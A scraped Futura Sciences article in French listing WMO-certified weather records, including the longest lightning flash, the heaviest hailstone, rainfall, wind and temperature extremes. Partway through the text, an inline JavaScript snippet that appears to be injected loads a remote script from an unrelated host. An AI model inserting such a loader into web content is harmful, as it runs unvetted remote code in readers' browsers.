{"title": "Eclair, grele, precipitations : top 5 des phenomenes meteorologiques les plus extremes", "newspaper": "Futura Sciences", "author": ["Nathalie Mayer"], "date_publi": "2017-05-07", "content": "C'est a l'Organisation meteorologique mondiale (OMM) que revient la tache de valider les extremes meteorologiques et climatiques. En 2016, deux records concernant la foudre ont ainsi ete consignes pour la toute premiere fois. Et cocorico puisque l'un d'entre eux, celui de l'eclair le plus long, revient a la France. Les  Archives mondiales de donnees concernant les extremes meteorologiques et climatiques  relevant de l'Organisation meteorologique mondiale (OMM) sont accessibles a tous sur  Internet . En 2016, deux nouvelles lignes ont fait leur apparition dans le tableau. Elles concernent la  foudre . L'eclair le plus long Les eclairs ne s'etendent generalement pas sur une distance de plus de 12 kilometres et ne durent que quelques centiemes de seconde. (c) Jean-Marie Muggianu, Flickr, CC by-NC-ND 2.0                               Selon les experts de l'OMM, un  eclair  enregistre en juin 2007 dans l'Oklahoma a parcouru une distance record de 321 kilometres. Generalement, la longueur d'un  eclair  se situe aux alentours de 12 kilometres...  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Quant a l'eclair qui a dure le plus longtemps, il a ete enregistre dans le sud de la France - du cote de la Drome pour etre plus precis - en aout 2012. Il a dure pas moins de 7,74 secondes alors que la plupart des eclairs ne brillent pas plus de quelques centiemes de seconde. Des grelons gros comme des boules de petanque Les averses de grele peuvent etre particulierement destructrices. (c) Nikolay Litov, Shutterstock                               La grele est un phenomene meteorologique que nous connaissons autant que nous le craignons. Car les grelons, qui ont en general un diametre compris entre 5 millimetres et 5 centimetres, peuvent causer beaucoup de degats. Et en avril 1986, c'est un grelon de 1,02  kilogramme  qui est tombe au Bangladesh lors d'une averse de grele qui fit 92 morts. Des records de precipitations En juin 2013, il est tombe entre 110 et 180 millimetres de pluie sur le relief des Pyrenees en seulement 48 heures. (c) Crispin Semmens, CC by SA-2.0                               Du cote des  precipitations , les records enregistres par l'OMM sont nombreux puisqu'ils detaillent le nombre de  millimetres de pluie  tombe en 1 minute, en 1 heure, en 12 heures, etc. Ainsi par exemple, en 1956, aux Etats-Unis, il est tombe 31,2 millimetres de pluie en 1 minute seulement et en Inde, 2,493 metres en 48 heures. A l'inverse, une region du Chili a connu une periode de  secheresse  record, longue de 173 mois, entre octobre 1903 et janvier 1918. Quand le vent souffle A partir d'une vitesse de 89 kilometres par heure, Meteo France attribue aux vents la qualite de tempete. (c) smolyaninov, Shutterstock                               La  rafale de vent  la plus impressionnante a ete enregistree en Australie, en avril 1996. Ce jour-la, le  vent  a souffle a 113,2 metres par seconde soit environ 407,5 kilometres par heure ! A titre de comparaison, les vents qui ont balaye l'Europe en decembre 1999 n'avaient pas depasse les 260 kilometres par heure. Records de temperatures Durant l'ete 2015, des  temperatures ressenties  (qui ne correspondent pas a la temperature de l' air ) ont depasse 70 degC. (c) Acid Pix, Flickr, CC by 2.0 Enfin, l'OMM recense egalement les records affiches par les  thermometres  et en la  matiere , ce sont les Etats-Unis et l' Antarctique  qui l'emportent avec une temperature de 56,7 degC affichee en juillet 1913 d'une part et de -89,2 degC affichee en juillet 1983 d'autre part. La pointe a -93,2 degC mesuree en aout 2010 en  Antarctique  n'est pas encore officielle... En France, c'est la Corse qui detient le record (donnees  Meteo  France depuis 1900) avec un modeste 43 degC affiche en juillet 2009. Et c'est en Franche-Comte que la temperature la plus basse a ete enregistree en 1985 aux alentours de -41 degC. Etonnant : des grelons geants en forme... de cerveaux                       Des chasseurs d'orage racontent leur rencontre avec une averse de grelons exceptionnellement gros, << de la taille d'une balle de baseball >>, et dont la surface porte des circonvolutions, tel un cerveau. Decouvrez comment se forment ces etranges grelons en video.                                       ", "theme": "planete"}